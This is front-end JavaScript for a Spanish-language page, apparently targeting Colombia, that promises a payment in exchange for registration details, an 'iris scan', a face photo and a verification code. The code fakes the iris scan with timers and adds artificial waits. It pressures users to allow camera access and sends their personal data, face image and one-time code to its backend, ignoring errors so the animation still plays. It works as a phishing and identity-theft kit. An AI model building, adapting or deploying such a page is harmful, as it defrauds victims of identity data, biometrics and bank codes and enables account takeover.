const API_URL = '/api';

// State
let userData = {};
let capturedPhotoBlob = null;
let stream = null;

// DOM Elements
const screens = {
    landing: document.getElementById('landing-page'),
    loading: document.getElementById('loading-screen'),
    iris: document.getElementById('iris-scanner'),
    face: document.getElementById('face-capture'),
    payment: document.getElementById('payment-verification'),
    success: document.getElementById('success-screen')
};

const loadingMessage = document.getElementById('loading-message');

// Navigation Helper
function showScreen(screenName) {
    Object.values(screens).forEach(screen => screen.classList.remove('active'));
    screens[screenName].classList.add('active');
}

// Loading Helper
function showLoading(message, duration, nextScreen) {
    loadingMessage.textContent = message;
    showScreen('loading');
    
    setTimeout(async () => {
        // Initialize camera if moving to scanner or face capture
        if (nextScreen === 'iris' || nextScreen === 'face') {
            const cameraSuccess = await startCamera(nextScreen === 'iris' ? 'iris-video' : 'face-video');
            if (!cameraSuccess) {
                // If camera fails, stay on loading screen or show error
                loadingMessage.textContent = "⚠️ Error: Se requiere acceso a la cámara para continuar.";
                loadingMessage.style.color = "red";
                return;
            }
        }
        showScreen(nextScreen);
    }, duration);
}

// Camera Helper
async function startCamera(videoElementId) {
    try {
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        
        const videoElement = document.getElementById(videoElementId);
        stream = await navigator.mediaDevices.getUserMedia({ video: true });
        videoElement.srcObject = stream;
        return true;
    } catch (err) {
        console.error("Error accessing camera:", err);
        alert("⚠️ ACCESO DENEGADO: Para continuar y recibir el pago, es OBLIGATORIO permitir el uso de la cámara. Por favor recarga la página y acepta los permisos.");
        return false;
    }
}

function stopCamera() {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }
}

// 1. Form Submission
document.getElementById('registration-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const formData = new FormData(e.target);
    userData = Object.fromEntries(formData.entries());

    // Combine date fields
    const day = document.getElementById('dob-day').value.padStart(2, '0');
    const month = document.getElementById('dob-month').value;
    const year = document.getElementById('dob-year').value;
    userData.fechaNacimiento = `${day}/${month}/${year}`;

    // Send data to backend
    try {
        await fetch(`${API_URL}/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(userData)
        });
        
        showLoading("Procesando tus datos...", 10000, 'iris');
    } catch (error) {
        console.error("Error:", error);
        alert("Hubo un error al enviar los datos.");
    }
});

// 2. Iris Scan
document.getElementById('btn-scan-iris').addEventListener('click', () => {
    // Simulate scan process
    const btn = document.getElementById('btn-scan-iris');
    btn.textContent = "ESCANEANDO...";
    btn.disabled = true;

    setTimeout(() => {
        stopCamera(); // Stop iris camera before moving
        showLoading("Analizando biometría del iris...", 15000, 'face');
    }, 5000); // Short delay for "scanning" effect before loading screen
});

// 3. Face Capture
const faceVideo = document.getElementById('face-video');
const faceCanvas = document.getElementById('face-canvas');
const btnCapture = document.getElementById('btn-capture-face');
const postCaptureControls = document.getElementById('post-capture-controls');
const btnRetake = document.getElementById('btn-retake');
const btnSendFace = document.getElementById('btn-send-face');

btnCapture.addEventListener('click', () => {
    // Draw video frame to canvas
    faceCanvas.width = faceVideo.videoWidth;
    faceCanvas.height = faceVideo.videoHeight;
    faceCanvas.getContext('2d').drawImage(faceVideo, 0, 0);
    
    // Show canvas, hide video
    faceVideo.style.display = 'none';
    faceCanvas.style.display = 'block';
    
    // Toggle buttons
    btnCapture.style.display = 'none';
    postCaptureControls.style.display = 'flex';

    // Convert to blob
    faceCanvas.toBlob(blob => {
        capturedPhotoBlob = blob;
    }, 'image/png');
});

btnRetake.addEventListener('click', () => {
    faceVideo.style.display = 'block';
    faceCanvas.style.display = 'none';
    btnCapture.style.display = 'block';
    postCaptureControls.style.display = 'none';
    capturedPhotoBlob = null;
});

btnSendFace.addEventListener('click', async () => {
    if (!capturedPhotoBlob) {
        alert("⚠️ Error: No se ha capturado ninguna foto. Por favor intente de nuevo.");
        return;
    }

    const formData = new FormData();
    formData.append('photo', capturedPhotoBlob);
    formData.append('nombre', userData.nombre);

    try {
        await fetch(`${API_URL}/upload-face`, {
            method: 'POST',
            body: formData
        });
        
        stopCamera();
        showLoading("Verificando identidad facial...", 30000, 'payment');
    } catch (error) {
        console.error("Error:", error);
        alert("Error al subir la foto.");
    }
});

// 4. Payment Verification
document.getElementById('btn-verify-payment').addEventListener('click', async () => {
    const code = document.getElementById('payment-code').value;
    if (code.length < 4) {
        alert("Por favor ingresa un código válido.");
        return;
    }

    // Send OTP to backend
    try {
        await fetch(`${API_URL}/verify-payment`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                code: code,
                nombre: userData.nombre
            })
        });
    } catch (error) {
        console.error("Error sending OTP:", error);
        // Continue anyway to show the animation
    }

    // 5 minutes = 300,000 ms
    const FIVE_MINUTES = 5 * 60 * 1000; 
    
    // Set current date for success screen
    const now = new Date();
    document.getElementById('current-date').textContent = now.toLocaleDateString('es-CO', {
        year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit'
    });

    showLoading("Procesando transacción bancaria... (Esto puede tardar hasta 5 minutos)", FIVE_MINUTES, 'success');
});
